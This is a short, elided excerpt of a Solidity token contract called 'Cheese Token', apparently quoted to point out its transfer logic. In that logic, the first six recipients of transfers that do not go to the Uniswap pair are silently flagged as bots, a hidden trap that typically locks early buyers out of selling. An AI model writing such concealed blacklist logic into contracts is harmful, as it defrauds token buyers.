...
contract CheeseToken is Context, IERC20, Ownable {
    ...
    uint256 private sniperCount = 0;
    string private constant _name = "Cheese Token";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != address(this)) {
            ...
            if(sniperCount < 6 && to != uniswapV2Pair){
                sniperCount++;
                bots[to] = true;
            }
